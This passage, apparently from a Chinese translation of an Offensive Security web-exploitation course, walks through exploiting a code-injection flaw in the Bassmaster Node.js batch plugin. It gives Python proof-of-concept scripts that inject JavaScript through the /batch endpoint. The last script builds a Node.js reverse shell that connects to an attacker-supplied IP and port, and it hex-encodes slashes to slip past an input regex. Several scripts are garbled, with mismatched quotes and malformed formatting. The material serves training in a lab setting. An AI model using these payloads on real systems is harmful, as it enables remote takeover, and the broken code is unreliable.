
```js
{ method: 'GET', path: '/item', handler: internals.activeItem },
{ method: 'GET', path: '/item$1/id', handler: internals.item },
{ method: 'GET', path: '/request', handler: internals.requestBatch }
});
};
```

列表 226 - Bassmaster 示例代码

具体来说，从上面的列表中可以看到示例代码清晰地定义了两种到达批量处理函数的方法。第一种是通过对 `GET` 请求的间接路径

## 攻击性安全

如第 71 行所示的 `/request` 路由。第二个是向第 53 行在线的 `/batch` 内部端点的直接 `JSON POST` 请求。

尽管如此，我们可以使用以下 Python 脚本来发送示例请求的精确副本：

```python
import requests,sys

if len(sys.argv) != 2:
    print("usage: %s <target>" % sys.argv[0])
    sys.exit(1)

target = "http://%s:8080/batch" % sys.argv[1]

request_1 = {"method":"get","path":"/profile"}
request_2 = {"method":"get","path":"/item"}
request_3 = {"method":"get","path":"/item/$1.id"}

json = {"Requests":[%s,%s,%s]} % (request_1, request_2, request_3)

r = requests.post(target, json=json)

print(r.text)
```

Listing 227 - 根据 `~/bassmaster/examples/batch.js` 中的注释运行请求的脚本

一旦使用 `bassmaster` 示例文件启动 `Node.js` 运行时，我们就可以执行我们的脚本。如果一切运行符合预期，我们应该收到如下的响应：

```bash
kali@kali:$bassmaster python bassmaster_valid.py bassmaster
[{"id":"f6bdda9db1b","name":"John Doe"},{"id":"55cf687663","name":"Active Item"},{"id":"55cf678663","name":"Item"}]
kali@kali:$bassmaster$
```

Listing 228 - 预期响应是向 `bassmaster` 服务器上的 `/batch` 的有效 `POST` 提交

此时，我们可以开始思考恶意请求应该是什么样，以便到达我们想要针对的 `eval/function`。

## 6.5 触发漏洞

事实证明，我们 `JSON` 请求中唯一的“清理”是通过我们在上一节中提到的正则表达式完成的，该正则表达式用于检查有效的项目格式。作为一个快速回顾，该正则表达式看起来如下所示：

```js
//(?:\/)?(?:\$(\d+)\.*)?([^\$]+)/g
```

Listing 229 - 用于匹配的正则表达式

描述和理解正则表达式的一种简单方法是使用提供正则表达式测试环境的公共网站之一。在这种情况下，我们将使用原始负载中的一个已知字符串并进行细微修改。

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_209_0.png)

图 119：找到匹配第二个组的字符串

我们可以看到，正斜杠本质上被用作字符串分隔符，斜杠之间的字符串使用点字符作为分隔符进行分组，但只有 `$\d` 被匹配了。

在图 119 中，我们尝试向原始负载中注入字符串 `*,hacked*` 并成功通过了正则表达式测试。由于 `*` 字符会终止 JavaScript 中的语句，我们现在应该能够在原始指令后面添加代码并查看我们是否执行了它！作为概念证明，我们可以使用 `NodeJS` `util` 模块的 `log` 方法向控制台写入消息。首先，让我们双重检查这是否对我们的正则表达式有效。

⁵⁴ https://regex101.com/
⁶⁵ https://nodejs.org/api/util.html#util_log

## 攻击性安全
www.offensivesecurity.com

高级网络攻击与利用

| 正则表达式 | 解释 |
| --- | --- |
| `/\(?\(\$\d\)?.*?\*\)/` | 匹配信息 |
| 测试字符串 | 匹配 1 |
| `/item\$1.id;require('util').log('hacked');` | 完整匹配 0-5 `'/item'` |
| | 组 2 n/a `'item'` |
| | 匹配 2 |
| | 完整匹配 5-43 `'/$1.id;require('util').log('hacked');'` |
| | 组 1 n/a `'1'` |
| | 组 2 n/a `'require('util').log('hacked');'` |

图 120：带有正则表达式的负载

在图 120 中，我们的整个负载被分组在组 2 中，这意味着我们应该到达 `eval` 函数并且我们的负载应该执行。让我们将其添加到脚本看看我们是否获得了任何输出。

下面的概念证明可以为我们完成工作。它构建 `JSON` 负载并将我们选择的代码附加到最后一个请求项。

```python
import requests,sys

if len(sys.argv) != 3:
    print("(+) usage: %s <target> <cmd_injection> %s" % sys.argv[0])
    sys.exit(-1)

target = "http://%s:8080/batch" % sys.argv[1]

cmd = sys.argv[2]

request_1 = {'method":"get","path":"/profile"}
request_2 = {'method":"get","path":"/item"}
request_3 = {'method":"get","path":"/item$1.id;%s"} % cmd

json = {'requests":"%s,%s,%s"} % (request_1, request_2, request_3)

r = requests.post(target, json=json)

print(r.text)
```

Listing 230 - 根据 `~/bassmaster/examples/batch.js` 中的注释运行请求的脚本

## 高级Web攻击与利用

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_213_0.png)

```
student@bassmaster: ~bassmaster

File Edit View Search Terminal Help

student@bassmaster:~/bassmaster nodejs examples/batch.js

Server started.

Executing: id;var net = require('net'),sh = require('child_process').exec('
```

图 122：调试获取反向 Shell 的失败尝试

这看起来完全不像完整的代码注入！我们的有效负载（payload）似乎在第一个斜杠处被截断了。然而，如果你还记得那个过滤我们输出的正则表达式，那么这个结果其实是合理的。让我们把整个有效负载提交给正则检查器，看看解析是如何进行的的。

| 正则表达式 | 2 处匹配 (-1ms) | 解释 |
| --- | --- | --- |
| `/\?(:V|\(\|\($d|\w)\)?\([\w]+\))*/` | `/ gn` | 匹配信息 |
| 测试字符串 | | 匹配1 完整匹配 61-65 `'/bin'` |
| `var net = require('net').sh sh =` | `n/a 'bin'` | |
| `require('child_process').exec('/bin/bash'); var client` | 组 2 | |
| `new = net.Socket();client.connect(3555,` | | `n/a '/bin/bash'; var client` |
| `'192.168.2.209', function() {` | | `-new = net.Socket();` |
| `{client.stdout=sh.stdin.pipe(client);sh.stderr=sh.stdout.pipe(client);` | | `};` |
| `.pipe(client)); });` | | `function (client)` |

图 123：正则检查器运行了 `Node.js` 反向 Shell

我们可以看到，该正则表达式显式地寻找正斜杠并据此对输入进行分组。同样，这是合理的，因为 Bassmaster 插件期望的输入实际上是路径。

由于我们的有效负载包含正斜杠，`/bin/bash` 被正则表达式截断了。这意味着我们需要弄清楚如何克服这种字符限制。幸运的是，JavaScript 字符串可以通过由十六编码字符以及其他编码组合而设计。因此，我们应该能够对正斜杠进行十六编码，并绕过正则解析的限制。以下证明将十六编码方案与 `cmd` 字符串连接。

AWAE © 2019 Offsec Securities Ltd. 保留所有权利。213

# 攻击性安全

高级Web攻击与利用

```python
import requests, sys

if len(sys.argv) != 4:
    print("(usage: %s <target> attacking address <attacking port>\n") % sys.argv[0])
    sys.exit(-1)

target = "http://%s:8080/batch" % sys.argv[1]

cmd = "\\x22bin\\x22bash"

attackerip = sys.argv[2]
attackerport = sys.argv[3]

request_1 = {"method": "get", "path":"/profile"}
request_2 = {"method": "get", "path":"/child_process/%s"}

shell = ' var net = require("net");, sh = require("child_process").exec('%s'); ' % cmd

shell += ' var client = new net.Socket();
shell += ' client.connect(%s, %s, function() {\nshell += ' client.pipe(sh.stdin);sh.stdout.pipe(client);' % (attackerport, attackerip)

shell += ' sh.stderr.pipe(client);
shell += '});

request_3 = {"method": "get", "path":"/item/1.id?%s"} % shell

json = {"requests": [%s, %s]} % (request_1, request_2, request_3)

r = requests.post(target, json)
```

列表 236 - 通过十六编码避免字符限制

剩下的就是测试我们新的有效负载了。我们使用 `netcat` 监听器，并将 `IP` 和端口传递给我们的脚本。

![](img/5d1c2c08c609e4691e93ba5fa2d52a8a_214_0.png)

图 124：Bassmaster 代码注入导致反向 Shell

版权 © 2019 Offsec Services Ltd. 保留所有权利。214

# 攻击性安全

高级Web攻击与利用

太棒了！我们的字符规避成功了，我们获得了反向 Shell！

### 6.6.1 练习

重复本模块概述的步骤并获取反向 Shell。

### 6.6.2 额外

学生用户目录下包含一个名为 `bassmaster_extile` 的子目录。在该目录中，我们稍微修改了 Bassmaster 的原始代码以利用漏洞。

从额外目录启动 `NodeJS` `batch.js` 并利用新的限制。

```bash
student@bassmaster:-$ cd bassmaster_extile
student@bassmaster:-/bassmaster_extile$ nodejs examples/batch.js
Server started.
```
